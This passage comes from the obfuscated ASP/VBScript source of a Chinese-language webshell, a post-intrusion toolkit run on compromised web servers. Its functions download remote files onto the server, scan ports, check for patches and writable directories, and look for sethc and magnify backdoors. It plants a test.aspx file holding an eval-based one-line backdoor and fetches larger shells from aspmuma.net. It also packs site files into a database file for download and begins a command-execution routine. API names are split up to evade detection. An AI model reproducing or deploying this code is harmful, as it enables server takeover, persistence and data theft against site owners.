if instr(dez,"x:\")>0 then rnm=rnm&br&replace(dez,"x:\",x.driveletter&":\")
next
for each xx in split(rnm,br)
if djf then fhq xx,ovy,wld
if ifp="1" then cie xx
if afc="1" then oim xx
pkm
next
oob
xlj 0
rny"'% id='zs",""
rny"","&nbsp;"
cqm
itm"var nfo=document.getElementsByName('fo').length;var nfi=document.getElementsByName('fi').length;var total='';if(nfo!=0){total=total+'&#30446;&#24405;&#65306;'+nfo;}if(nfo!=0&nfi!=0){total=total+','}if(nfi!=0){total=total+'&#25991;&#20214;&#65306;'+nfi;}var altotal='&#25628;&#32034;&#23436;&#27605;,&#20849;&#25628;&#21040;:\n'+total;if(total==''){altotal='&#25628;&#32034;&#23436;&#27605;\n&#27809;&#25628;&#21040;&#31526;&#21512;&#26465;&#20214;&#30340;&#23545;&#35937;*_*'}alert(altotal);total='<b>&#24635;&#25968;: </b>'+(nfo+nfi)+'&nbsp;&nbsp;'+total;document.getElementById('zs').innerHTML=total;"
pkm
end sub
function ckz()
On Error Resume Next
if lastn="" then lastn="|asp|asa|cer|cdx|aspx|asax|ascx|cs|jsp|php|txt|inc|ini|js|htm|html|xml|ybe|"
if qs="fl" then pgh=dez
if qs="sb" then cen=dez
if qs="xz" then lsv=dez
if lsv="" then lsv="http://127.0.0.1/1/text1.txt|"&iax&"\title.asp"&br&"http://127.0.0.1/2/text2.txt|"&iax&"\title.html"&br&"http://127.0.0.1/3/text3.txt|c:\title.bat"
if pgh="" then pgh=session("cyk")
If cen=""Then cen="HK"&xxk&"LM\SYSTEM\CurrentControl"&rxt&"Set\Control\ComputerName\ComputerName\ComputerName"
oob
xlj 4
rny"'% colspan='2","<h2>"&bvy("t")&"&#26816;&#27979;&#27880;&#20876;&#34920;:</h2>"
dvs 4
bzg"chyy","","":ekf"dez","hidden",pgh:ekf"qs","hidden","":ekf"zxp","hidden","ckz"
rny 60,"&#26816; &#27979; &#39033;:":rny"","<textarea name=zcbx id=zcbx rows=6 style='width:724px'>"&cen&"</textarea>&nbsp;&nbsp;"&ohp("botton^:qs.value='sb';dez.value=zcbx.value;gtf('chyy')","button","Go")
dvs 4
rny"'% colspan='2","<h2>"&bvy("t")&"&#19979;&#36733;&#21040;&#26381;&#21153;&#22120;:</h2>"
dvs 4
rny"","&#19979;&#36733;&#20301;&#32622;:"
rny"","<textarea name=xzsz id=xzsz rows=6 style='width:724px'>"&lsv&"</textarea>&nbsp;&nbsp;"&ohp("botton^:qs.value='xz';dez.value=xzsz.value;gtf('chyy')","button","Go")
dvs 4
rny"'% colspan='2","<h2>"&bvy("t")&"&#25991;&#20214;&#25195;&#25551;:</h2>"
dvs 4
rny 60,"&#30446;&#26631;&#30446;&#24405;:":rny"",ohp("chfl","text|760",pgh)
dvs 4
rny"","&#20851; &#38190; &#23383;:"
rny"",ohp("tio","text|600",tio)&ohp("sctype","radio"" checked ""","1")&"&#25991;&#20214;&#21517;"&ohp("sctype","radio","2")&"&#20869;&#23481; "&ohp("afc","checkbox"" checked ""","1")&"&#23376;&#30446;&#24405;  "
dvs 4
rny"","&#25991;&#20214;&#31867;&#22411;:"
rny"",ohp("lastn","text|676",lastn)&"&nbsp;&nbsp;"&ohp("botton^:qs.value='fl';dez.value=chfl.value;gtf('chyy')","button","&#24320;&#22987;&#25628;&#32034;")
ekf"ifp","hidden",1:ekf"ovy","hidden",1:ekf"wld","hidden",1
cqm
jzg
select case qs
case"fl"
wcj false
case"sb"
faq "100%"
xlj 3
rny"'% colspan='2","<h2>"&bvy("t")&"&#26816;&#27979;&#32467;&#26524;:</h2>"
dvs 4
rny"70%",b("&#38190;")
rny"30%",b("&#20540;")
cqm
For Each ude In Split(dez,br)
jfr=ubv(ude)
if err.number=0 then
oob:xlj 1
rny"70%",ude
rny"30%",jfr
cqm
end if
pkm
Next
faq"100%"" style=""cursor:pointer;"" onclick=""javascript:ipr('doChkReg_1')"
wfp
rny 10,"<div style='width:10px;height:10px;' id='ss_1'>"&uvg(bvy("3"))&"</div>"
rny"100%",b("&#26410;&#33021;&#35835;&#21462;&#30340;&#39033;&#30446;")
cqm
j"<div id=""doChkReg_1"" style=""display:none;"">"
For Each ude In Split(dez,br)
jfr=ubv(ude)
if err.number<>0 then
oob:xlj 1
rny"100%",jfr
cqm
err.clear
end if
pkm
Next
j"</div>"
case"xz","zx"
bzg"gem",ghq,"fileframe":ekf"zxp","hidden",0:ekf"dez","hidden",0:jzg
oob
xlj 3
rny"'% colspan='3","<h2>"&bvy("t")&"&#19979;&#36733;&#32467;&#26524;:</h2>"
dvs 4
rny"40%",b("&#28304;")
rny"30%",b("&#30446;&#24405;")
rny"30%",b("&#25991;&#20214;")
cqm
Set zoh=axu(jdu(7))
Set zhx=axu(jdu(9))
i=0
for each x in split(dez,br)
ymyurl=split(x,"|")(0)
if ymyurl<>"" then
i=i+1
tag=""
tag=split(x,"|")(1)
err.clear
zhx.Open"GET",ymyurl,False
zhx.send
oob
xlj(i mod 2)
rny"40%",ymyurl
If Err Then
j"<td colspan='2'><b>&#38169;&#35823;1: "&Err.Description&"&#38169;&#35823;&#28304;: "&Err.Source&"</b></td>":err.clear
else
With zoh
.Type=1
.Mode=3
.Open
.Write zhx.ResponseBody
.Position=0
.SavetoFile tag,2
.Close
End With
If Err Then
j"<td colspan='2'><b>&#38169;&#35823;2: "&piq(tag)&Err.Description&"&#38169;&#35823;&#28304;: "&Err.Source&"</b></td>":err.clear
Else
gzw tag,tag
rny"30%",gzw(tag,juppath)
rny"30%",tyh("bgu",tag,tag)
End If
end if
cqm
end if
pkm
next
Set zoh=nothing
Set zhx=nothing
end select
if qs="zx" then bzg"n",rol(tag,"\"),"":jzg:itm"n.submit()"
end function
function bgr()
On Error Resume Next
eza="k952004m09-012k956572m09-012k2393802m11-011k2592799m11-080k2621440m12-0203k2160329m10-048k970483m09-020k2124261m10-065k2271195m10-065k977165m10-015k2360937m10-084k2478960m11-014k2507938m11-056k2566454m11-062k2646524m12-003k2645640m12-009k2641653m12-018k944653m07-067k952004m09-012k971657m09-041k2620712m11-097k942831m08-005k2503665m11-046k2592799m11-080"
if qs="ml" then ydo=dez
if qs="kb" then tfv=dez
if ydo="" then ydo="x:\boot.ini"&br&"x:\windows\"&br&"x:\Documents and Settings\"&br&"x:\Program Files\"
for each x in split(eza,"k")
if x<>"" then uxo=uxo&"KB"&split(x,"m")(0)&"@MS"&split(x,"m")(1)&br
next
if tfv="" then tfv=uxo
oob
xlj 4
rny"'% colspan='2","<h2>"&bvy("t")&"&#30446;&#24405;&#25195;&#25551;:</h2>"
dvs 4
rny 60,"&#30446;&#24405;&#25991;&#20214;:":rny"","<textarea name=chml id=chml rows=8 style='width:760px;margin-bottom:5px;'>"&ydo&"</textarea>"&"<li>"&piq("&#30446;&#24405;&#25195;&#25551; &#35831;&#22312;&#32467;&#23614;&#36755;&#20837; \ &#21542;&#21017;&#35270;&#20026;&#25991;&#20214;,&#25991;&#20214;&#25195;&#25551;&#35831;&#36755;&#20986;&#25991;&#20214;&#32477;&#23545;&#36335;&#24452;&#21644;&#25991;&#20214;&#20840;&#21517;&#31216;")&"<li>"&piq("&#30424;&#31526;&#35774;&#32622;&#20026;x,&#21017;&#24490;&#29615;&#25195;&#25551;&#21508;&#29289;&#29702;&#30913;&#30424;")
bzg"chxx","","":ekf"dez","hidden",jqj:ekf"qs","hidden","":ekf"zxp","hidden","bgr":ekf"ooc","hidden","post":ekf"che","hidden","post"
dvs 4
rny"","&#25628;&#32034;&#33539;&#22260;:"
rny"",ohp("afc","checkbox","1")&"&#23376;&#30446;&#24405;  "&ohp("ifp","checkbox","1")&"&#21253;&#21547;&#25991;&#20214;  "&ohp("ovy","checkbox"" checked ""","1")&"&#26174;&#31034;&#19981;&#21487;&#35835;&#23545;&#35937;  "&ohp("wld","checkbox"" checked ""","1")&"&#26174;&#31034;&#19981;&#21487;&#20889;&#23545;&#35937;  "&ohp("botton^:qs.value='ml';dez.value=chml.value;gtf('chxx')","button","&#24320;&#22987;&#25628;&#32034;")
dvs 4
rny"'% colspan='2","<h2>"&bvy("t")&"&#34917;&#19969;&#26816;&#27979;:</h2>"
dvs 4
rny"","&#34917;&#19969;&#21015;&#34920;:"
rny"","<textarea name=tfv id=tfv rows=6 style='width:676px;'>"&tfv&"</textarea>&nbsp;&nbsp;"&ohp("botton^:qs.value='kb';dez.value=tfv.value;gtf('chxx')","button","&#24320;&#22987;&#25628;&#32034;")
dvs 4
rny"'% colspan='2","<h2>"&bvy("t")&"&#31471;&#21475;&#25195;&#25551;:</h2>"
dvs 4
rny"","IP:"
rny"",ohp("ooc1","text|760","127.0.0.1")
dvs 4
rny"","Port:"
rny"",ohp("che1","text|713","21,23,80,1433,1521,3306,3389,4899,8080,439"&guf&"58,65500")&"&nbsp;&nbsp;"&ohp("botton^:qs.value='dk';gtf('chxx')","button","&#25195;&#25551;")
jzg
cqm
select case qs
case"ml"
wcj true
case"kb"
for each y in split(dez,br)
if y<>"" then
if not cf.fileexists("c:\windows\"&split(y,"@")(0)&".log") and y<>"" then fbp=fbp&replace(y,"@","...")&"...&#34917;&#19969;&#19981;&#23384;&#22312;<br>"
end if
next
oob
dvs 3
rny"","<h2>"&bvy("t")&"&#26816;&#27979;&#32467;&#26524;:</h2>"
wfp
rny"",fbp
cqm
case"dk"
If Not aeg(ooc,"^((\d{1,3}\.){3}(\d{1,3}),)*(\d{1,3}\.){3}(\d{1,3})$")Then
j"IP&#26684;&#24335;&#19981;&#31526;"
End If
If Not aeg(che,"^(\d{1,5},)*\d{1,5}$")Then
j"&#31471;&#21475;&#26684;&#24335;&#19981;&#31526;"
End If
j"&#25628;&#32034;ing...<br>"
pkm
For Each mct In Split(ooc,",")
For Each znz In Split(che,",")
yfv mct,znz
Next
Next
end select
end function
Sub yfv(ruj,ghr)
On Error Resume Next
Dim xnr,eam
Set xnr=axu(jdu(12))
eam="Provider=SQLOLEDB.1;Data Source="&ruj&","&ghr&";User ID=lake2;Password=lake2;"
xnr.ConnectionTimeout=1
xnr.open eam
If Err Then
If Err.number=-2147217843 or Err.number=-2147467259 Then
If InStr(Err.description,"(Connect()).")>0 Then
j"<label>"&ruj&":"&ghr&"</label>&nbsp;<label> close</label><br>"
Else
j"<label>"&ruj&":"&ghr&"</label>&nbsp;<label>"&piq(" open")&"</font></label><br>"
End If
pkm
End If
End If
End Sub
Function wvm(bwz,icu,mjf,xqk)
On Error Resume Next
i=1
wvm=0
dim yni,wfd,zde,lfl
yni=1
yqc = bwz&cf.GettempName
Set f = cf.GetFolder(bwz)
if xqk=0 then
if err.number=0 then wvm=1
err.clear
exit function
end if
if err then
wfd=ttg
if icu=0 then yni=0
wvm=1
else
wfd=kyj
end if
err.clear
execute "cf.Creat"&prl&"eTextFile(yqc)"
if err then
zde=ttg
if mjf=0 then yni=0
else
zde=kyj
end if
execute "cf.Delete"&xyi&"File(yqc)"
err.clear
lfl=bvy(0)&qjd(bwz,piq(bwz))
if pbwell then i=0:lfl=bvy(0)&qjd(bwz,bwz)
if yni=1 and cf.folderexists(bwz) then 
oob
xlj i
j mvs("fo")
rny"",lfl
rny"30c",wfd
rny"30c",zde
cqm
end if
end Function
function xzr(dxn,icu,mjf)
On Error Resume Next
dim xxw,jgn,uyl
xxw=1
if clng(cf.GetFile(dxn).size/1024)<1024 then
set getAtt=axu(jdu(7))
getAtt.Type=2
getAtt.mode=3 
getAtt.open
execute "getAtt.Loa"&cvf&"dFromFile(dxn)"
getAtt.readtext
else
sdflj
end if
if err then
jgn=ttg
if icu=0 then xxw=0
else
jgn=kyj
end if
getAtt.Close 
set getAtt = Nothing
err.clear
set getAtt=cf.GetFile(dxn)
getAtt.Attributes = getAtt.Attributes
if err then
uyl=ttg
if mjf=0 then xxw=0
else
uyl=kyj
end if
err.clear
xzr = Err.Number 
set getAtt = Nothing  
if xxw=1 and cf.FileExists(dxn) then 
oob
xlj 1
j mvs("fi")
dim mcg
mcg=mid(dxn,instr(1,dxn,tio,1),len(tio))
rny"",bvy(LCase(rol(dxn,".")))&tyh("bgu",dxn,replace(dxn,tio,piq(mcg),1,-1,1))
rny"30c",jgn
rny"30c",uyl
cqm
end if
end function
function qty()
On Error Resume Next
dim jaz
jaz=split("php,jsp,aspx",",")
bzg"ob",ghq,""
ekf"zxp","hidden","npi"
ekf"bki","hidden",""
oob
xlj 4
if bki="de" then
execute "cf.DeleteF"&nqg&"ile(server.mappath(""test.aspx""))"
execute "cf.De"&tmu&"leteFile(server.mappath(""test.php""))"
execute "cf.DeleteF"&pkl&"ile(server.mappath(""test.jsp""))"
rny"'% colspan='3' height='100'c","&#21024;&#38500;&#23436;&#27605;!"
else
execute "cf.Cr"&ogs&"eateTextFile(server.mappath(""test.php"")).Write""<?PHP echo 'oo&#8745;_&#8745;oo'?><?php phpinfo()?>"""
execute "cf.Crea"&dxq&"teTextFile(server.mappath(""test.jsp"")).Write""Jsp Test oo&#8745;_&#8745;oo"""
execute "cf.CreateText"&jte&"File(server.mappath(""test.aspx"")).Write""""&chr(60)&""%@ Page Language=""""Jscript"""" validateRequest=""""false"""" ""&chr(37)&""""&chr(62)&""""&chr(60)&""""&chr(37)&""Response.Write(eval(Request.Item[""""w""""],""""unsafe""""));""&chr(37)&""""&chr(62)&""aspx Test oo&#8745;_&#8745;oo"""
for each x in jaz
rny"c","<iframe src=test."&x&" width=300 height=100></iframe>"
next
dvs 4:rny"'% colspan='3'c",ohp("^:bki.value='de';gtf('ob')","button","&#21024;&#38500;&#27979;&#35797;&#25991;&#20214;")
end if
jzg
bzg"chyy",ghq,"":ekf"dez","hidden","":ekf"qs","hidden","":ekf"zxp","hidden","ckz"
dvs 4
for each x in jaz
rny"c",ohp("botton^:dez.value='"&yry("http://aspmuma.net/web/"&x&".txt|"&Server.MapPath("test."&x))&"';qs.value='zx';gtf('chyy')","button","&#19979;&#36733;"&x&"&#22823;"&"&#39532;")
next
jzg
cqm
End function
'!>
function xfu()
On Error Resume Next
bzg"gem",ghq,"fileframe":ekf"zxp","hidden",0:ekf"dez","hidden",0:jzg
Dim kcm(6,2)
kcm(0,1)="c:\windows\syste"&eik&"m32\sethc.exe"
kcm(0,2)="shi"&"ft&#21518;"&"&#38376;"
kcm(1,1)="c:\windows\syste"&eik&"m32\dllcache\sethc.exe"
kcm(1,2)=kcm(0,2)
kcm(2,1)="c:\windows\syste"&eik&"m32\magnify.exe"
kcm(2,2)="&#25918;&#22823;"&"&#38236;&#21518;"&"&#38376;"
kcm(3,1)="c:\windows\syste"&eik&"m32\dllcache\magnify.exe"
kcm(3,2)=kcm(2,2)
kcm(4,1)="c:\windows\my.ini"
kcm(4,2)="mysql&#25968;&#25454;&#24211;&#37197;&#32622;&#25991;&#20214;"
kcm(5,1)="C:\Documents and Settings\All Users\&#12300;&#24320;&#22987;&#12301;&#33756;&#21333;\&#31243;&#24207;\Gene6 FTP Server.lnk"
kcm(5,2)="Gene6 FTP"
oar"&#26381;&#21153;&#22120;&#21518;&#38376;&#26816;&#27979;",4,1
oob
xlj 4
rny"",uvg(b("&#21518;&#38376;&#31181;&#31867;"))
rny"",uvg(b("&#25991;&#20214;&#21517;"))
rny"80",uvg(b("&#22823;&#23567;"))
rny"30c",uvg(b("&#23646;&#24615;"))
rny"150c",uvg(b("&#26368;&#21518;&#20462;&#25913;&#26102;&#38388;"))
rny"150c",uvg(b("&#21019;&#24314;&#26102;&#38388;"))
rny"150c",uvg(b("&#26368;&#21518;&#35775;&#38382;&#26102;&#38388;"))
for i=0 to 5
set f=cf.getfile(kcm(i,1))
if err.number=0 then
dvs 0
rny"",kcm(i,2)
rny"",tyh("sim",kcm(i,1),kcm(i,1))
rny"",f.size/1024&" k"
rny"c",f.Attributes
rny"c",f.DateLastModified
rny"c",f.DateCreated
rny"c",f.DateLastAccessed
end if
set f=nothing
err.clear
next
cqm
end function
function ofv()
On Error Resume Next
dim uxr,uym,kth
bzg"gem",ghq,"_blank":ekf"zxp","hidden",0:ekf"dez","hidden",0:jzg
itm"function d(id){var o=document.getElementById(id);if(o.style.display==''){o.style.display='none';}else{o.style.display='';}}"
pbwell=true
j"<div id=z style='font-size:20px;'></div>"
sbn
cqm
dim ggh
kth=3
f=0
ggh=false
cms
'<!
oar"&#21361;&#38505;&#30446;&#24405;&#26816;&#27979;",2,1
oob
xlj 5:j"<td width='50%'>"
faq"100%"
xlj 4
rny"",uvg(b("&#30446;&#24405;&#21517;&#31216;"))
rny 30,uvg(b("&#21487;&#35835;"))
rny 30,uvg(b("&#21487;&#20889;"))
cqm
for each x in cf.drives
if wvm(x&"\",1,1,1)=0 then
if x=split(iax,"\")(0) then
kth=kth-1
end if
f=f+1
else
if x=split(iax,"\")(0) then
ggh=true
end if
end if
quu=quu&","&x&"\recycler"
next
uxr="&#26377; "&piq(f)&" &#20010;&#30913;&#30424;&#26681;&#30446;&#24405;&#21487;&#20197;&#35775;&#38382;&#65281;":f=0
e=ubound(split(iax,"\"))
if ggh then
for a=0 to e
d=""
for c=0 to e-a
d=d&split(iax,"\")(c)&"\"
next
if wvm(d,0,1)=0 and f<a then f=a
next
uxr=uxr&"web&#26681;&#30446;&#24405;&#20197;&#19978; "&piq(f)&" &#32423;&#30446;&#24405;&#21487;&#35835;&#65307;&#22914;&#22823;&#20110;3&#32423;&#65292;&#26381;&#21153;&#22120;&#21017;&#26377;&#21487;&#33021;&#23384;&#22312;&#36328;&#31449;&#36328;&#30446;&#24405;&#28431;&#27934;&#65281;"
else
uxr=uxr&"web&#26681;&#30446;&#24405;&#25152;&#22312;&#30913;&#30424;&#26681;&#30446;&#24405; "&piq(split(iax,"\")(0))&" &#21487;&#20197;&#35775;&#38382;!"
end if
itm"y2.innerHTML='&#12288;&#12288;"&uxr&"';"
j"</td>"
rny"",uxr
cqm
cqm
if ogg(jdu(1)) or ogg(jdu(2)) then kth=kth-1
select case kth
case 1:kth="&#20302;"
case 2:kth="&#20013;"
case 3:kth="&#39640;"
end select
itm"z.innerHTML='&#26381;&#21153;&#22120;&#23433;&#20840;&#25351;&#25968;:"&piq(kth)&"';"
'!>
oar"&#24120;&#29992;&#32452;&#20214;&#26816;&#27979;",1,1
oob
xlj 4
bzg"ob",ghq,""
ekf"zxp","hidden","ofv"'"kxx"
ekf"dez","hidden",""
ekf"bki","hidden",""
rny"'% colspan='2",ohp("dez1","text|300",dez)&"&nbsp;"&ohp("^:gtf('ob')","button","&#26816;&#27979;")&"&nbsp;&nbsp;&nbsp;"&iif(dez<>"",dez&iif(ogg(dez),kyj,ttg),"")
jzg
for i=0 to 10
dvs 0
rny"50%",iif(ogg(jdu(i)),kyj,ttg)&jdu(i)
rny"50%",iif(ogg(jdu(i+11)),kyj,ttg)&jdu(i+11)
if ogg(jdu(i)) then f=f+1
next
if f mod 2=1 then rny"","&nbsp;"
uxr="&#23384;&#22312; "&piq(f)&" &#20010;&#39640;&#21361;&#32452;&#20214;&#65281;"
f=0:cqm
itm"y1.innerHTML='&#12288;&#12288;"&uxr&"';"
cqm
xfu:ayt
end function
end class
Class UUPC
Dim D1,D2
Public Function Form(F)
F=lcase(F)
If D1.exists(F) then:Form=D1(F):else:Form="":end if
End Function
Public Function UA(F)
F=lcase(F)
If D2.exists(F) then:set UA=D2(F):else:set UA=new FFIF:end if
End Function
Private Sub Class_Initialize
Dim TDa,TSt,vbCrlf,TIn,yln,T2,gmk,TFL,SFV,cbc,pjb,khr,wcy,kbq
set D1=axu(jdu(11))
if Request.TotalBytes<1 then Exit Sub
set T1 = axu(jdu(7))
T1.Type = 1 : T1.Mode =3 : T1.Open
T1.Write Request.BinaryRead(Request.TotalBytes)
T1.Position=0 : TDa =T1.Read : khr = 1
wcy = LenB(TDa)
set D2=axu(jdu(11))
vbCrlf = chrB(13) & chrB(10)
set T2 = axu(jdu(7))
TSt = MidB(TDa,1,InStrB(khr,TDa,vbCrlf)-1)
gmk = LenB (TSt)
khr=khr+gmk+1
while (khr + 10) < wcy
yln = InStrB(khr,TDa,vbCrlf & vbCrlf)+3
T2.Type = 1 : T2.Mode =3 : T2.Open
T1.Position = khr
T1.CopyTo T2,yln-khr
T2.Position = 0 : T2.Type = 2 : T2.Charset ="gb2312"
TIn = T2.ReadText : T2.Close
khr = InStrB(yln,TDa,TSt)
cbc = InStr(22,TIn,"name=""",1)+6
pjb = InStr(cbc,TIn,"""",1)
kbq = lcase(Mid (TIn,cbc,pjb-cbc))
if InStr (45,TIn,"filename=""",1) > 0 then
set TFL=new FFIF
cbc = InStr(pjb,TIn,"filename=""",1)+10
pjb = InStr(cbc,TIn,"""",1)
cbc = InStr(pjb,TIn,"Content-Type: ",1)+14
pjb = InStr(cbc,TIn,vbCr)
TFL.idg =yln
TFL.yzi = khr -yln -3
if not D2.Exists(kbq) then
D2.add kbq,TFL
end if
else
T2.Type =1 : T2.Mode =3 : T2.Open
T1.Position = yln : T1.CopyTo T2,khr-yln-3
T2.Position = 0 : T2.Type = 2
T2.Charset ="gb2312"
SFV = T2.ReadText
T2.Close
if D1.Exists(kbq) then
D1(kbq)=D1(kbq)&", "&SFV
else
D1.Add kbq,SFV
end if
end if
khr=khr+gmk+1
wend
TDa=""
set T2 =nothing
End Sub
Private Sub Class_Terminate
if Request.TotalBytes>0 then
D1.RemoveAll:D2.RemoveAll
set D1=nothing:set D2=nothing
T1.Close
set T1 =nothing
end if
End Sub
End Class
Class FFIF
dim yzi,idg
Private Sub Class_Initialize
yzi = 0
idg= 0
End Sub
Public function rck(F)
dim T3
rck=true
if trim(F)="" or idg=0 then exit function
set T3=axu(jdu(7))
T3.Mode=3 : T3.Type=1 : T3.Open
T1.position=idg
T1.copyto T3,yzi
execute "T3.SavetoFil"&fej&"e F,2"
T3.Close
set T3=nothing
rck=false
end function
End Class
function kxx()
j"<center><br><br><br><br><br>"&dez&iif(ogg(dez),kyj,ttg)&"</center>"
end function
'<!
Sub zhu(koc,ude,rs,zoh)
On Error Resume Next
Dim iov,weu,nyr,files,zvv
set zvv=axu(jdu(0))
slf=Lcase(slf)
Set weu=zvv.GetFolder(ude)
If Err Then jji Err
For Each iov In weu.Files
If Not(aeg(rol(iov.name,"."),"^("&ysi&")$") Or Lcase(iov.Name)=mdbName Or Lcase(iov.Name)=mdbName2)Then
rs.AddNew
rs("wki")=Replace(iov.Path,koc&"\","")
execute "zoh.Loa"&rfb&"dFromFile(iov.Path)"
rs("binContent")=zoh.Read()
rs.Update
j iov.Path&" ...... "
j iif(err>0,ttg&" ...... "&Err.Description,kyj)
j"<br>"
err.clear
pkm
End If
Next
For Each iov In weu.SubFolders
If Not aeg(iov.name,"^("&slf&")$")Then
zhu koc,iov.Path,rs,zoh
End If
Next
set zvv=Nothing
Set files=Nothing
Set nyr=Nothing
Set weu=Nothing
End Sub
Sub yrw()
On Error Resume Next
Server.ScriptTimeOut=5000
koc=session("cyk")
cxa=Server.MapPath(axu(jdu(0)).GetTempName&".mdb")
Dim rs,eam,tyj
Set rs=axu(jdu(15))
Set zoh=axu(jdu(7))
Set tyj=axu(jdu(13))
mdbName=rol(cxa,"\")
eam="Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&cxa
tyj.Create eam
Set xnr=axu(jdu(12))
xnr.Open eam
if err Then jji err
xnr.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED,wki VarChar,binContent Image)")
If Err Then jji Err
zoh.Open
zoh.Type=1
rs.Open"FileData",xnr,3,3
mdbName=Lcase(mdbName)
mdbName2=Replace(mdbName,".mdb",".ldb")
zhu koc,koc,rs,zoh
rs.Close
vmz
zoh.Close
Set rs=Nothing
Set zoh=Nothing
Set tyj=Nothing
If Err Then
jji(Err)
Else
bzg"gem",ghq,"filelist":ekf"zxp","hidden",0:ekf"dez","hidden",0:jzg
ifz"&#25171;&#21253;&#25104;&#21151;!"
ifz ere(rol(cxa,"\"),"target='_blank'",cxa)
End If
j sxi
End Sub
'!>
Sub vmz()
On Error Resume Next
If IsObject(xnr)Then
xnr.Close
Set xnr=Nothing
End If
End Sub
Sub ifz(str)
sxi=sxi&"<li>"&str&"</li>"
End Sub
function b(str)
b="<b>"&str&"</b>"
end function
Function rol(str,chs)
If str="" Or InStr(str,chs)<1 Then
rol=""
Exit Function
End If
rol=Mid(str,InstrRev(str,chs)+Len(chs))
End Function
Function vgm(str,chs,lsw)
If str="" Or InStr(str,chs)<1 Then
vgm=""
Exit Function
End If
If lsw Then
vgm=Left(str,InStr(str,chs)-1)
Else
vgm=Left(str,InstrRev(str,chs)-1)
End If
End Function
sub jvm(feu,yas,tia,ksv,psw,tdy,mzl,okj)
bzg"ff",yas,feu
ekf"zxp","hidden",tia
ekf"khd","hidden","post"
rny"",ohp("dez1",psw,ksv)&ohp("bki1",mzl,tdy)
ekf"dez","hidden",0
ekf"bki","hidden",0
rny 10,ohp("^:gtf('ff');","button",okj)
jzg
end sub
function nik(ltk)
nik=ohp("^:if("&ltk&".rows>3)"&ltk&".rows-=3","button|25","-")&ohp("^:"&ltk&".rows+=3","button|25","+")
end function
sub bzg(i,a,t)
j"<form name="""&i&""" id="""&i&""" method=""post"" action="""&a&""""
if t<>"" then j" target="""&t&""""
j" onSubmit=""javascript:gtf('"&i&"')"">"
end sub
sub jzg()
j"</form>"
end sub
function ohp(i,t,v)
dim szq,z,r,w,y
if instr(i,"^")>0 then
y=split(i,"^")(1)
select case left(y,1)
case ":" w=" onclick"
case ";" w=" onchange"
end select
w=w&"=""javascript:"&mid(y,2)&";"""
i=split(i,"^")(0)
end if
z=split(t,"|")
if ubound(z)>0 then
t=z(0)
szq=z(1)
else
szq="100%"
end if
r="<input type="""&t&""" name="""&i&""" id="""&i&""""
if t="text" or ubound(z)>0 then r=r&" style=""width:"&szq&";"""
if left(t,5)="radio" or left(t,8)="checkbox" then r=r&" class=""radio"""
if trim(v)<>"0" then r=r&" value="""&v&""""
ohp=r&w&">"
end function
sub ekf(i,t,v)
if i="zxp" then j ohp(i&"1",t,v)
j ohp(i,t,v)
end sub
Function gej(str)
On Error Resume Next
str=CStr(str)
If IsNull(str)Or str=""Then
gej=""
Exit Function
End If
gej=Server.HtmlEncode(str)
End Function
Function IIf(var,waa,vhb)
If var = True Then IIf = waa Else IIf = vhb
End Function
function piq(str)
piq="<font color="&cl(16)&">"&str&"</font>"
end function
function uvg(str)
uvg="<font color=blue>"&str&"</font>"
end function
sub div(str,tqn)
j"<div style='margin:"&tqn&"px;'>"&str&"</div>"
end sub
sub yce(str)
j"<h2>"&str&"</h2>"
end sub
function mytitle(str)
mytitle="<b style='color:"&cl(13)&"'>"&str&"</b>"
end function
sub wvy(str)
j"<h3 style='background-color:"&cl(0)&"'>"&bvy("t")&str&"</h3>"
end sub
function lvr(width)
lvr="<table width="""&width&"""border=""0""cellpadding=""0""cellspacing=""0"">"
end function
sub faq(width):j lvr(width):end sub
sub oob():faq"100%":end sub
function pqm(num)
dim qqg
if num=1 then qqg=cl(3)
if num=0 then qqg=cl(1)
if num=3 then qqg=cl(0)
if num=2 then qqg=cl(7)
pqm="<tr style=""background-color:"&qqg&""""
if num<2 then pqm=pqm&" onmouseover=""javascript:this.style.backgroundColor='"&cl(7)&"';"" onmouseout=""javascript:this.style.backgroundColor='"&qqg&"';"""
pqm=pqm&">"
End function
function znv(num)
znv="</tr>"&pqm(num)
end function
sub xlj(num)
j pqm(num)
end sub
sub dvs(num)
j znv(num)
end sub
function plj(width,td)
If td=""Or IsNull(td)Then td=piq("Null")
plj="<td"
if right(width,1)="c" then
plj=plj&" width='"&mid(width,1,len(width)-1)&"' align='center'"
else
If isnumeric(width) or instr(width,"%")>0 Then
plj=plj&" width='"&width&"'"
else 
if width<>"" then plj=plj&" nowrap "
end if
end if
plj=plj&">"&CStr(td)&"</td>"
End function
sub rny(width,td)
j plj(width,td)
end sub
sub cqm()
j"</tr></table>"
end sub
Sub wfp()
j"<tr>"
End Sub
Function knd(str,cth)
objRe.Pattern=cth
Set knd=objRe.Execute(str)
End Function
sub vqj()
On Error Resume Next
dim ypd
zni="http://"&xhc("SERVER_NAME")&":"&xhc("SERVER_PORT")&vgm(xhc("PATH_INFO"),"/",False)&"/"&fgb&"?"&xhc("QUERY_STRING")
Set zhx=axu(jdu(9))
Set zoh=axu(jdu(7))
zhx.Open"GET",zni,False
zhx.send
If aeg(zhx.getAllResponseHeaders(),"charSet ?= ?[""']?[\w-]+")Then
ypd=Trim(regReplace(knd(zhx.getAllResponseHeaders(),"charSet ?= ?[""']?[\w-]+",False)(0),"charSet ?= ?[""']?",""))
ElseIf aeg(zhx.ResponseText,"charSet ?= ?[""']?[\w-]+")Then
ypd=Trim(regReplace(knd(zhx.ResponseText,"charSet ?= ?[""']?[\w-]+",False)(0),"charSet ?= ?[""']?",""))
End If
if ypd="" then ypd=kuf
With zoh
.Type=2
.Open
.WriteText zhx.responseBody
.Position=0
.CharSet=ypd
.Position=2
j .ReadText(.Size)
.close
End With
Set zoh=Nothing
Response.status=zhx.status
Response.end
end sub
sub fua()
For Each queryContent In request.queryString
wba yxm(queryContent)&"=request.queryString("""&queryContent&""")"
Next
For Each queryContent In request.Form
wba yxm(queryContent)&"=fvn("""&queryContent&""")"
Next
end sub
Sub jji(Err)
If Err Then
j"<hr style='color:"&cl(13)&";'/><font size=2><li>&#38169;&#35823;: " & Err.Description & "</li><li>&#38169;&#35823;&#28304;: " & Err.Source & "</li><br/>"
j"<hr style='color:"&cl(13)&";'/>&nbsp;</font>"
Err.Clear
Response.End
End If
End Sub
Sub itm(sStr)
j vbNewLine & "<script type=""text/javascript"">" & sStr & "</script>" & vbNewLine
End Sub
'<!
Function txk()
On Error Resume Next
Dim rtl
if bdv="" then wschd="checked":bdv="/c set"
if azp<>"" then session("azp")=azp
